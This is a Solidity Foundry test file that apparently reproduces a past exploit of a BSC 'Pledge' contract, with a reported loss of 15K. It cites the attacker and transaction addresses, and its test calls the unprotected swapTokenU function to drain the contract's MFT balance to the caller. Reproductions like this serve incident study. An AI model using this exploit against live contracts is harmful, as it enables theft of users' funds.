// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : 15K
// Attacker : https://bscscan.com/address/0x59367b057055fd5d38ab9c5f0927f45dc2637390
// Attack Contract : https://bscscan.com/address/0x4aa0548019bfecd343179d054b1c7fa63e1e0b6c
// Vulnerable Contract : https://bscscan.com/address/0x061944c0f3c2d7dabafb50813efb05c4e0c952e1
// Attack Tx : https://bscscan.com/tx/0x63ac9bc4e53dbcfaac3a65cb90917531cfdb1c79c0a334dda3f06e42373ff3a0

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x061944c0f3c2d7dabafb50813efb05c4e0c952e1#code

// @Analysis
// Post-mortem : 
// Twitter Guy : 
// Hacking God : 
pragma solidity ^0.8.0;

import "../interface.sol";

interface IPledge {
    function swapTokenU(uint256 amount, address _target) external;
}

contract Pledge is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 44_555_337;
    address internal constant pledge =  0x061944c0f3c2d7DABafB50813Efb05c4e0c952e1;
    address internal constant MFT = 0x4E5A19335017D69C986065B21e9dfE7965f84413;
    address internal constant BUSD = 0x55d398326f99059fF775485246999027B3197955;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        deal(BUSD, address(this), 0);
        fundingToken = address(BUSD);
    }

    function testExploit() public balanceLog {
        uint256 amount = IERC20(MFT).balanceOf(pledge);
        address _target = address(this);
        IPledge(pledge).swapTokenU(amount, _target);
    }
}
